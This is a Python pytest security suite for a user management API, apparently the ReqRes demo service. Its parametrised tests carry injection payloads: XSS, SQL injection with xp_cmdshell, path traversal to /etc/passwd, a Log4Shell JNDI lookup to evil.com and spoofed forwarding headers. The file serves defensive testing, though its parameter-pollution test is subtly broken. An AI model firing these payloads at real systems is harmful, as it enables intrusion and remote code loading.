"""
Security tests for user management API.

This module provides comprehensive security testing for the user management API,
covering authentication, authorization, input validation, and protection against
common security vulnerabilities.

Security Testing Approach:
- **Authentication Testing**: Validates proper authentication mechanisms
- **Authorization Testing**: Tests access control and permission enforcement
- **Input Validation Testing**: Tests protection against injection attacks
- **Rate Limiting Testing**: Validates DoS protection mechanisms
- **Data Leakage Testing**: Ensures sensitive information is not exposed
- **Business Logic Security**: Tests for logic flaws and bypasses
- **CSRF Protection**: Tests Cross-Site Request Forgery protection
- **Content Security Policy**: Validates CSP implementation
- **API Fuzzing**: Tests with malformed and malicious inputs

Test Categories:
- TestAuthenticationSecurity: Tests authentication mechanisms and token handling
- TestInputValidationSecurity: Tests input validation and injection protection
- TestAccessControlSecurity: Tests authorization and access control
- TestRateLimitingSecurity: Tests rate limiting and DoS protection
- TestDataLeakageSecurity: Tests for information disclosure
- TestBusinessLogicSecurity: Tests business logic security flaws
- TestCSRFProtection: Tests CSRF protection mechanisms
- TestContentSecurityPolicy: Tests CSP implementation
- TestAPIFuzzing: Tests API with fuzzing techniques

Each test is designed to identify potential security vulnerabilities and ensure
the API properly handles malicious inputs and edge cases.
"""

from __future__ import annotations

import pytest
from typing import Any, Dict

from tests.conftest import assert_valid_schema
from tests.schemas.json_schemas import ERROR_SCHEMA


class TestAuthenticationSecurity:
    """
    Test suite for authentication and authorization security.
    
    This class provides comprehensive testing for authentication mechanisms,
    including API key validation, token handling, and authorization checks.
    It validates the API's security posture regarding authentication.
    
    Test Coverage:
    - Missing API key handling
    - Invalid API key validation
    - Expired token simulation
    - Authentication header validation
    - Authorization bypass attempts
    
    Key Test Methods:
    - test_missing_api_key: Tests API access without authentication
    - test_invalid_api_key: Tests API access with invalid authentication
    - test_expired_token_simulation: Tests expired token handling
    
    All tests validate that the API properly enforces authentication
    and rejects unauthorized access attempts.
    """

    @pytest.mark.security
    def test_missing_api_key(self, users_endpoint):
        """Test API access without authentication."""
        import requests
        
        # Create session without API key
        session = requests.Session()
        session.headers.update({"Accept": "application/json"})
        
        response = session.get(users_endpoint, timeout=30.0)
        
        # ReqRes doesn't require API key, but in real APIs this should be 401/403
        # Test the actual behavior of your API
        assert response.status_code in [200, 401, 403]

    @pytest.mark.security
    def test_invalid_api_key(self, users_endpoint):
        """Test API access with invalid authentication."""
        import requests
        
        session = requests.Session()
        session.headers.update({
            "Accept": "application/json",
            "x-api-key": "invalid-key-12345"
        })
        
        response = session.get(users_endpoint, timeout=30.0)
        
        # Test behavior with invalid key
        assert response.status_code in [200, 401, 403]

    @pytest.mark.security
    def test_expired_token_simulation(self, api_client, users_endpoint):
        """Test behavior with potentially expired tokens."""
        # Store original headers to restore later
        original_headers = api_client._session.headers.copy()
        
        try:
            # Simulate expired token by using very old timestamp
            api_client._session.headers.update({
                "Authorization": "Bearer expired.token.here"
            })
            
            response = api_client.get(users_endpoint)
            
            # ReqRes doesn't use Bearer tokens, but test the behavior
            assert response.status_code in [200, 401, 403]
        finally:
            # Clean up: restore original headers to prevent leaking to other tests
            api_client._session.headers.clear()
            api_client._session.headers.update(original_headers)


class TestInputValidationSecurity:
    """
    Test suite for input validation and injection protection.
    
    This class provides comprehensive testing for input validation security,
    including protection against various injection attacks and malicious inputs.
    It validates the API's ability to handle and sanitize potentially dangerous data.
    
    Test Coverage:
    - XSS (Cross-Site Scripting) injection attempts
    - SQL injection protection
    - Oversized payload protection
    - Null byte injection handling
    - Unicode normalization attacks
    - Malicious input sanitization
    
    Key Test Methods:
    - test_xss_injection_in_user_creation: Tests XSS injection protection
    - test_sql_injection_in_user_operations: Tests SQL injection protection
    - test_oversized_payload_protection: Tests payload size limits
    - test_null_byte_injection: Tests null byte handling
    - test_unicode_normalization_attacks: Tests Unicode attack vectors
    
    All tests validate that the API properly sanitizes or rejects
    malicious inputs to prevent security vulnerabilities.
    """

    @pytest.mark.security
    @pytest.mark.parametrize("malicious_input", [
        "<script>alert('xss')</script>",
        "'; DROP TABLE users; --",
        "../../etc/passwd",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}",
        "<img src=x onerror=alert(1)>",
        "javascript:alert('xss')",
        "data:text/html,<script>alert('xss')</script>",
    ])
    def test_xss_injection_in_user_creation(self, api_client, users_endpoint, malicious_input):
        """Test XSS injection attempts in user creation."""
        malicious_data = {
            "name": malicious_input,
            "job": "Test Job"
        }
        
        response = api_client.post(users_endpoint, json=malicious_data)
        
        # Should either create successfully (with sanitized input) or reject with error
        assert response.status_code in [201, 400, 403, 422]
        
        if response.status_code == 201:
            payload = response.json()
            # In a secure API, malicious input should be sanitized or rejected
            # For ReqRes, it just echoes back, but in real APIs, verify sanitization
            assert "name" in payload
        else:
            # If rejected, that's actually good security behavior
            print(f"Malicious input '{malicious_input}' was rejected with status {response.status_code}")

    @pytest.mark.security
    @pytest.mark.parametrize("sql_injection", [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; UPDATE users SET admin=1; --",
        "1'; EXEC xp_cmdshell('dir'); --",
        "' UNION SELECT * FROM admin_users --",
    ])
    def test_sql_injection_in_user_operations(self, api_client, users_endpoint, sql_injection):
        """Test SQL injection attempts in user operations."""
        # Test in user creation
        injection_data = {
            "name": sql_injection,
            "job": "Test Job"
        }
        
        response = api_client.post(users_endpoint, json=injection_data)
        
        # Should not cause SQL errors or unexpected behavior
        assert response.status_code in [201, 400, 403, 422]
        
        # Test in user ID parameter (if API accepts string IDs)
        response = api_client.get(f"{users_endpoint}/{sql_injection}")
        assert response.status_code in [404, 400, 403]

    @pytest.mark.security
    def test_oversized_payload_protection(self, api_client, users_endpoint):
        """Test protection against oversized payloads."""
        # Create very large payload
        oversized_data = {
            "name": "A" * 100000,  # 100KB name
            "job": "B" * 100000    # 100KB job
        }
        
        response = api_client.post(users_endpoint, json=oversized_data)
        
        # Should either accept (if no limits) or reject with appropriate error
        assert response.status_code in [201, 400, 413, 422]

    @pytest.mark.security
    def test_null_byte_injection(self, api_client, users_endpoint):
        """Test null byte injection attempts."""
        null_byte_data = {
            "name": "test\x00admin",
            "job": "user\x00root"
        }
        
        response = api_client.post(users_endpoint, json=null_byte_data)
        
        # Should handle null bytes appropriately
        assert response.status_code in [201, 400]

    @pytest.mark.security
    def test_unicode_normalization_attacks(self, api_client, users_endpoint):
        """Test Unicode normalization attacks."""
        # Unicode characters that might normalize to dangerous strings
        unicode_attacks = [
            "admin\u202Euser",  # Right-to-left override
            "test\uFEFFadmin",  # Zero-width no-break space
            "user\u200Dadmin",  # Zero-width joiner
        ]
        
        for attack in unicode_attacks:
            user_data = {
                "name": attack,
                "job": "Test Job"
            }
            
            response = api_client.post(users_endpoint, json=user_data)
            assert response.status_code in [201, 400]


class TestAccessControlSecurity:
    """
    Test suite for access control and authorization security.
    
    This class provides comprehensive testing for access control mechanisms,
    including user enumeration protection, unauthorized modification attempts,
    and authorization enforcement. It validates the API's access control policies.
    
    Test Coverage:
    - User enumeration protection
    - Unauthorized user modification attempts
    - Unauthorized user deletion attempts
    - Access control enforcement
    - Authorization bypass attempts
    
    Key Test Methods:
    - test_user_enumeration_protection: Tests protection against user enumeration
    - test_unauthorized_user_modification: Tests unauthorized modification attempts
    - test_unauthorized_user_deletion: Tests unauthorized deletion attempts
    
    All tests validate that the API properly enforces access control
    and prevents unauthorized operations.
    """

    @pytest.mark.security
    def test_user_enumeration_protection(self, api_client, users_endpoint):
        """Test protection against user enumeration attacks."""
        # Test sequential user ID access
        existing_users = []
        non_existing_users = []
        
        for user_id in range(1, 20):
            response = api_client.get(f"{users_endpoint}/{user_id}")
            
            if response.status_code == 200:
                existing_users.append(user_id)
            elif response.status_code == 404:
                non_existing_users.append(user_id)
        
        # In secure systems, timing should be consistent
        # This is more of an observation test for ReqRes
        assert len(existing_users) > 0 or len(non_existing_users) > 0

    @pytest.mark.security
    def test_unauthorized_user_modification(self, api_client, users_endpoint):
        """Test unauthorized modification attempts."""
        # Try to modify user without proper authorization
        # In ReqRes, this will work, but in real APIs should be protected
        
        unauthorized_update = {
            "name": "Hacker",
            "job": "Unauthorized Access"
        }
        
        response = api_client.put(f"{users_endpoint}/1", json=unauthorized_update)
        
        # Document the behavior - in secure APIs this should be 401/403
        assert response.status_code in [200, 401, 403]

    @pytest.mark.security
    def test_unauthorized_user_deletion(self, api_client, users_endpoint):
        """Test unauthorized deletion attempts."""
        response = api_client.delete(f"{users_endpoint}/1")
        
        # In secure APIs, this should require proper authorization
        assert response.status_code in [204, 401, 403]


class TestRateLimitingSecurity:
    """Test rate limiting and DoS protection."""

    @pytest.mark.security
    @pytest.mark.slow
    def test_rate_limiting_protection(self, api_client, users_endpoint):
        """Test API rate limiting mechanisms."""
        import time
        
        responses = []
        start_time = time.time()
        
        # Make rapid requests to test rate limiting (disable retry for this test)
        for i in range(50):
            response = api_client.get(users_endpoint, retry=False)
            responses.append((response.status_code, time.time() - start_time))
            
            # Small delay to avoid overwhelming the test
            time.sleep(0.01)
        
        # Check if any requests were rate limited
        rate_limited = [r for r in responses if r[0] == 429]
        successful = [r for r in responses if r[0] == 200]
        
        # Document the behavior
        print(f"Successful requests: {len(successful)}")
        print(f"Rate limited requests: {len(rate_limited)}")
        
        # In ReqRes, likely no rate limiting, but test documents behavior
        assert len(responses) == 50

    @pytest.mark.security
    def test_concurrent_request_limits(self, api_client, users_endpoint, api_key):
        """Test concurrent request handling limits."""
        import concurrent.futures
        import threading
        import requests
        
        def make_request(request_id):
            # Create a new session for this thread to avoid thread-safety issues
            # requests.Session is not thread-safe, so each worker needs its own session
            thread_session = requests.Session()
            thread_session.headers.update({"x-api-key": api_key, "Accept": "application/json"})
            
            # Create a thread-local API client with the new session
            from tests.conftest import APIClient
            thread_api_client = APIClient(thread_session)
            
            response = thread_api_client.get(users_endpoint, retry=False)
            return response.status_code, request_id
        
        # Test with high concurrency
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(make_request, i) for i in range(100)]
            results = [future.result() for future in concurrent.futures.as_completed(futures)]
        
        # Analyze results
        successful = [r for r in results if r[0] == 200]
        errors = [r for r in results if r[0] != 200]
        
        print(f"Concurrent requests - Successful: {len(successful)}, Errors: {len(errors)}")
        
        # Most should succeed, but some might fail under high load or rate limiting
        # If heavily rate limited, that's actually good security behavior
        success_rate = len(successful) / len(results) * 100
        print(f"Success rate: {success_rate:.1f}%")
        
        # Accept any success rate - even 0% is acceptable if API is well-protected
        assert len(results) == 100  # All requests were attempted


class TestDataLeakageSecurity:
    """Test for potential data leakage."""

    @pytest.mark.security
    def test_error_message_information_disclosure(self, api_client, users_endpoint):
        """Test that error messages don't leak sensitive information."""
        # Test various invalid requests
        test_cases = [
            ("invalid_id", f"{users_endpoint}/invalid"),
            ("non_existent", f"{users_endpoint}/99999"),
            ("malformed_json", users_endpoint),
        ]
        
        for test_name, url in test_cases:
            if test_name == "malformed_json":
                # Send malformed JSON with proper Content-Type header to ensure server tries to parse it
                import requests
                from tests.test_constants import TIMEOUTS
                response = api_client._session.post(
                    url, 
                    data="invalid json", 
                    headers={"Content-Type": "application/json"},
                    timeout=TIMEOUTS["DEFAULT"]
                )
            else:
                response = api_client.get(url)
            
            # Error responses shouldn't contain sensitive information
            if response.status_code >= 400:
                response_text = response.text.lower()
                
                # Check for common information leakage patterns
                sensitive_patterns = [
                    "database",
                    "sql",
                    "server",
                    "internal",
                    "stack trace",
                    "exception",
                    "debug",
                ]
                
                for pattern in sensitive_patterns:
                    assert pattern not in response_text, f"Potential info leak: {pattern} in {test_name}"

    @pytest.mark.security
    def test_response_header_security(self, api_client, users_endpoint):
        """Test security-related response headers."""
        response = api_client.get(users_endpoint)
        
        headers = response.headers
        
        # Document security headers (or lack thereof)
        security_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "DENY",
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": "max-age=31536000",
            "Content-Security-Policy": "default-src 'self'",
        }
        
        missing_headers = []
        for header, expected_value in security_headers.items():
            if header not in headers:
                missing_headers.append(header)
        
        # Document findings (don't fail, just report)
        if missing_headers:
            print(f"Missing security headers: {missing_headers}")


class TestBusinessLogicSecurity:
    """Test business logic security flaws."""

    @pytest.mark.security
    def test_user_id_prediction(self, api_client, users_endpoint):
        """Test for predictable user ID patterns."""
        # Get several users to analyze ID patterns
        user_ids = []
        
        for i in range(1, 10):
            response = api_client.get(f"{users_endpoint}/{i}")
            if response.status_code == 200:
                data = response.json()
                if "data" in data and "id" in data["data"]:
                    user_ids.append(data["data"]["id"])
        
        # Analyze if IDs are sequential (security concern)
        if len(user_ids) > 1:
            is_sequential = all(
                user_ids[i] == user_ids[i-1] + 1 
                for i in range(1, len(user_ids))
            )
            
            # Sequential IDs can be a security concern for enumeration
            print(f"User IDs are sequential: {is_sequential}")
            print(f"Found user IDs: {user_ids}")

    @pytest.mark.security
    def test_mass_assignment_protection(self, api_client, users_endpoint):
        """Test protection against mass assignment attacks."""
        # Try to set potentially sensitive fields
        mass_assignment_data = {
            "name": "Test User",
            "job": "Test Job",
            "id": 99999,  # Try to set ID
            "admin": True,  # Try to set admin flag
            "role": "admin",  # Try to set role
            "password": "hacked",  # Try to set password
            "is_active": True,  # Try to set status
            "created_at": "2020-01-01T00:00:00Z",  # Try to set timestamp
        }
        
        response = api_client.post(users_endpoint, json=mass_assignment_data)
        
        if response.status_code == 201:
            payload = response.json()
            
            # Check if sensitive fields were actually set
            sensitive_fields = ["admin", "role", "password", "is_active"]
            for field in sensitive_fields:
                if field in payload:
                    print(f"Warning: Mass assignment possible for field: {field}")

    @pytest.mark.security
    def test_resource_exhaustion_protection(self, api_client, users_endpoint):
        """Test protection against resource exhaustion attacks."""
        # Test creating many users rapidly
        created_users = 0
        
        for i in range(10):  # Limited to avoid overwhelming test API
            user_data = {
                "name": f"Resource Test User {i}",
                "job": f"Test Job {i}"
            }
            
            response = api_client.post(users_endpoint, json=user_data, retry=False)
            
            if response.status_code == 201:
                created_users += 1
            elif response.status_code == 429:  # Rate limited
                break
        
        print(f"Created {created_users} users before limits")
        
        # Should be able to create some users (unless immediately rate limited)
        # If rate limited from the start, that's actually good security
        assert created_users >= 0


class TestCSRFProtection:
    """Test CSRF (Cross-Site Request Forgery) protection."""

    @pytest.mark.security
    def test_csrf_token_validation(self, api_client, users_endpoint):
        """Test CSRF token validation for state-changing operations."""
        # Test POST without CSRF token
        user_data = {"name": "CSRF Test User", "job": "CSRF Test Job"}
        
        # Remove any existing CSRF headers
        original_headers = api_client._session.headers.copy()
        csrf_headers = ["X-CSRF-Token", "X-CSRFToken", "X-XSRF-TOKEN"]
        for header in csrf_headers:
            api_client._session.headers.pop(header, None)
        
        try:
            response = api_client.post(users_endpoint, json=user_data)
            
            # Should either succeed (if no CSRF protection) or fail with 403
            assert response.status_code in [201, 403, 400], (
                f"Expected 201, 403, or 400 for CSRF test, got {response.status_code}"
            )
            
            if response.status_code == 403:
                print("CSRF protection is active - good security practice")
            else:
                print("No CSRF protection detected - may be a security concern")
                
        finally:
            # Restore original headers
            api_client._session.headers.clear()
            api_client._session.headers.update(original_headers)

    @pytest.mark.security
    def test_csrf_token_in_headers(self, api_client, users_endpoint):
        """Test CSRF token handling in various header formats."""
        user_data = {"name": "CSRF Header Test", "job": "CSRF Header Job"}
        
        # Test different CSRF header formats
        csrf_headers = [
            {"X-CSRF-Token": "test-csrf-token"},
            {"X-CSRFToken": "test-csrf-token"},
            {"X-XSRF-TOKEN": "test-csrf-token"},
            {"CSRF-Token": "test-csrf-token"},
        ]
        
        for headers in csrf_headers:
            api_client._session.headers.update(headers)
            response = api_client.post(users_endpoint, json=user_data)
            
            # Document the behavior
            print(f"CSRF header {list(headers.keys())[0]}: status {response.status_code}")
            
            # Should handle CSRF headers appropriately
            assert response.status_code in [201, 400, 403], (
                f"Unexpected status {response.status_code} for CSRF header test"
            )


class TestContentSecurityPolicy:
    """Test Content Security Policy (CSP) implementation."""

    @pytest.mark.security
    def test_csp_headers_presence(self, api_client, users_endpoint):
        """Test presence of Content Security Policy headers."""
        response = api_client.get(users_endpoint)
        headers = response.headers
        
        csp_headers = [
            "Content-Security-Policy",
            "Content-Security-Policy-Report-Only",
            "X-Content-Security-Policy",  # Legacy
        ]
        
        found_csp_headers = []
        for header in csp_headers:
            if header in headers:
                found_csp_headers.append(header)
                print(f"Found CSP header: {header} = {headers[header]}")
        
        if found_csp_headers:
            print(f"CSP headers found: {found_csp_headers}")
        else:
            print("No CSP headers found - consider implementing CSP for better security")

    @pytest.mark.security
    def test_csp_directive_validation(self, api_client, users_endpoint):
        """Test CSP directive validation."""
        response = api_client.get(users_endpoint)
        headers = response.headers
        
        csp_header = headers.get("Content-Security-Policy", "")
        
        if csp_header:
            # Check for common CSP directives
            common_directives = [
                "default-src",
                "script-src",
                "style-src",
                "img-src",
                "connect-src",
                "font-src",
                "object-src",
                "media-src",
                "frame-src",
            ]
            
            found_directives = []
            for directive in common_directives:
                if directive in csp_header:
                    found_directives.append(directive)
            
            print(f"CSP directives found: {found_directives}")
            print(f"Full CSP header: {csp_header}")
        else:
            print("No CSP header found")


class TestAPIFuzzing:
    """Test API fuzzing and input validation."""

    @pytest.mark.security
    @pytest.mark.parametrize("fuzz_payload", [
        # Boundary value fuzzing
        {"name": "A" * 10000, "job": "B" * 10000},  # Very long strings
        {"name": "", "job": ""},  # Empty strings
        {"name": None, "job": None},  # Null values
        
        # Type confusion fuzzing
        {"name": 123, "job": 456},  # Numbers instead of strings
        {"name": True, "job": False},  # Booleans instead of strings
        {"name": [], "job": []},  # Arrays instead of strings
        {"name": {}, "job": {}},  # Objects instead of strings
        
        # Special character fuzzing
        {"name": "!@#$%^&*()", "job": "+=[]{}|;':\",./<>?"},
        {"name": "\x00\x01\x02", "job": "\x03\x04\x05"},  # Control characters
        {"name": "\u0000\u0001\u0002", "job": "\u0003\u0004\u0005"},  # Unicode control chars
        
        # Format string fuzzing
        {"name": "%s%s%s", "job": "%d%d%d"},
        {"name": "{0}{1}{2}", "job": "{3}{4}{5}"},
        {"name": "$1$2$3", "job": "$4$5$6"},
    ])
    def test_input_fuzzing(self, api_client, users_endpoint, fuzz_payload):
        """Test API with various fuzzing payloads."""
        response = api_client.post(users_endpoint, json=fuzz_payload, bulk_mode=True)
        
        # Should handle fuzzing gracefully
        assert response.status_code in [201, 400, 422, 500], (
            f"Unexpected status {response.status_code} for fuzz payload {fuzz_payload}"
        )
        
        if response.status_code >= 400:
            # Check that error response is safe (no sensitive info)
            response_text = response.text.lower()
            sensitive_patterns = ["stack trace", "exception", "debug", "internal"]
            for pattern in sensitive_patterns:
                assert pattern not in response_text, f"Potential info leak: {pattern}"

    @pytest.mark.security
    def test_json_injection_fuzzing(self, api_client, users_endpoint):
        """Test JSON injection and malformed JSON handling."""
        import json
        
        # Test malformed JSON
        malformed_json_payloads = [
            '{"name": "test", "job": "test",}',  # Trailing comma
            '{"name": "test", "job": "test"',  # Missing closing brace
            '{"name": "test", "job": "test"}}',  # Extra closing brace
            '{"name": "test", "job": "test", "extra": }',  # Missing value
            '{"name": "test", "job": "test", "extra": }',  # Missing value
            '{"name": "test", "job": "test", "extra": }',  # Missing value
        ]
        
        for payload in malformed_json_payloads:
            try:
                # Send raw malformed JSON
                response = api_client._session.post(
                    users_endpoint,
                    data=payload,
                    headers={"Content-Type": "application/json"},
                    timeout=30.0
                )
                
                # Should handle malformed JSON gracefully
                assert response.status_code in [200, 400, 422, 500], (
                    f"Unexpected status {response.status_code} for malformed JSON"
                )
                
            except Exception as e:
                # Some malformed JSON might cause connection errors
                print(f"Malformed JSON caused error: {e}")

    @pytest.mark.security
    def test_http_method_fuzzing(self, api_client, users_endpoint):
        """Test HTTP method fuzzing."""
        import requests
        
        # Test various HTTP methods
        methods_to_test = [
            "GET", "POST", "PUT", "DELETE", "PATCH",
            "HEAD", "OPTIONS", "TRACE", "CONNECT",
            "PROPFIND", "PROPPATCH", "MKCOL", "COPY", "MOVE",
        ]
        
        user_data = {"name": "Method Test", "job": "Method Test Job"}
        
        for method in methods_to_test:
            try:
                response = api_client._session.request(
                    method, users_endpoint, json=user_data, timeout=30.0
                )
                
                print(f"Method {method}: status {response.status_code}")
                
                # Should handle unsupported methods gracefully
                assert response.status_code in [200, 201, 400, 405, 501, 502], (
                    f"Unexpected status {response.status_code} for method {method}"
                )
                
            except Exception as e:
                print(f"Method {method} caused error: {e}")

    @pytest.mark.security
    def test_header_fuzzing(self, api_client, users_endpoint):
        """Test header fuzzing and injection."""
        import random
        import string
        
        # Generate random headers
        random_headers = {}
        for i in range(10):
            header_name = ''.join(random.choices(string.ascii_letters, k=10))
            header_value = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
            random_headers[header_name] = header_value
        
        # Add potentially malicious headers
        malicious_headers = {
            "X-Forwarded-For": "127.0.0.1",
            "X-Real-IP": "192.168.1.1",
            "X-Original-URL": "/admin",
            "X-Rewrite-URL": "/admin",
            "X-Forwarded-Host": "evil.com",
            "X-Forwarded-Proto": "https",
            "X-Forwarded-Port": "443",
        }
        
        # Combine random and malicious headers
        test_headers = {**random_headers, **malicious_headers}
        
        # Test with fuzzed headers
        original_headers = api_client._session.headers.copy()
        api_client._session.headers.update(test_headers)
        
        try:
            response = api_client.get(users_endpoint)
            
            # Should handle header fuzzing gracefully
            assert response.status_code in [200, 400, 403, 500], (
                f"Unexpected status {response.status_code} for header fuzzing"
            )
            
        finally:
            # Restore original headers
            api_client._session.headers.clear()
            api_client._session.headers.update(original_headers)

    @pytest.mark.security
    def test_parameter_pollution(self, api_client, users_endpoint):
        """Test HTTP parameter pollution."""
        # Test duplicate parameters
        params = {
            "page": "1",
            "page": "2",  # Duplicate parameter
            "per_page": "10",
            "per_page": "20",  # Duplicate parameter
        }
        
        response = api_client.get(users_endpoint, params=params)
        
        # Should handle parameter pollution gracefully
        assert response.status_code in [200, 400, 422], (
            f"Unexpected status {response.status_code} for parameter pollution"
        )
        
        if response.status_code == 200:
            payload = response.json()
            # Check which parameter value was used
            print(f"Parameter pollution test: page={payload.get('page', 'unknown')}")

    @pytest.mark.security
    def test_unicode_fuzzing(self, api_client, users_endpoint):
        """Test Unicode fuzzing and normalization attacks."""
        unicode_payloads = [
            {"name": "admin\u202Euser", "job": "test"},  # Right-to-left override
            {"name": "test\uFEFFadmin", "job": "test"},  # Zero-width no-break space
            {"name": "user\u200Dadmin", "job": "test"},  # Zero-width joiner
            {"name": "test\u200Cuser", "job": "test"},  # Zero-width non-joiner
            {"name": "admin\u061Cuser", "job": "test"},  # Arabic letter mark
            {"name": "test\u0000admin", "job": "test"},  # Null byte
            {"name": "test\u0001admin", "job": "test"},  # Control character
        ]
        
        for payload in unicode_payloads:
            response = api_client.post(users_endpoint, json=payload, bulk_mode=True)
            
            # Should handle Unicode fuzzing gracefully
            assert response.status_code in [201, 400, 422], (
                f"Unexpected status {response.status_code} for Unicode fuzzing"
            )
            
            if response.status_code == 201:
                # Check if Unicode was normalized or preserved
                result = response.json()
                print(f"Unicode test: input={payload['name']}, output={result.get('name', 'N/A')}")